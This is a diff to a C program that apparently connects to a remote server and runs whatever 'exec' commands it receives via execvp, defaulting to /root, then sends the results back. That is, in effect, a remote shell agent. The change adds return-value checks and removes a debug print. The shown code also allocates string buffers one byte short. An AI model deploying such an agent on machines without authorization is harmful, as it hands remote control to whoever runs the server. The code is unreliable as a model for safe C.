@@ -26,7 +26,7 @@ int main()
     int sock_fd = socket(AF_INET,SOCK_STREAM, 0);
     struct sockaddr_in servaddr;
     char buf[BUFFER_SIZE];
-    int filesize, chunk;
+    int filesize, chunk, rv;
     FILE *fp;    
     char *cmd;
     struct timeval timeout={1800,0};
@@ -55,8 +55,10 @@ int main()
             if(strcmp(buf, "close") == 0){
                 break;
             } else if(strncmp(buf, "exec", 4) == 0){
-                execcmd(buf + 4);
-                sendresult(sock_fd, buf);
+                rv = execcmd(buf + 4);
+                if(rv > 0){
+                    sendresult(sock_fd, buf);
+                }
             }
         }
     }
@@ -84,7 +86,7 @@ int sendresult(int socket, char* buf){
 
 int execcmd(char* cmd){
     char *args[20];
-    int i, j;
+    int i, j, rv;
     char *str = (char*) malloc(strlen(cmd)*sizeof(char));
     
     while(*cmd == ' ') cmd++;
@@ -92,7 +94,6 @@ int execcmd(char* cmd){
         if(*cmd == ' ' || *cmd == '\n'){
             str[j] = '\0';
             args[i] = str;
-            printf("=%s=\n", str);
             if(*cmd == '\n'){
                 args[i+1] = NULL;
                 break;
@@ -107,9 +108,9 @@ int execcmd(char* cmd){
     }
     if(strcmp(args[0],"cd")==0){
         if(args[1] == NULL || strcmp(args[1],"~")==0 || strcmp(args[1],"")==0){
-            chdir("/root");
+            rv = chdir("/root");
         } else {
-            chdir(args[1]);
+            rv = chdir(args[1]);
         }
     } else {
         if((i=fork()) == 0){
@@ -117,11 +118,12 @@ int execcmd(char* cmd){
             execvp(args[0], args); 
         }
         waitpid(i, &j, 0);
+        rv = 1;
     }
     for(i=0; args[i] != NULL; i++){
         free(args[i]);
     }
-    return 0;
+    return rv;
 }
 
 int readbuf(int conn, char* buf, int size){
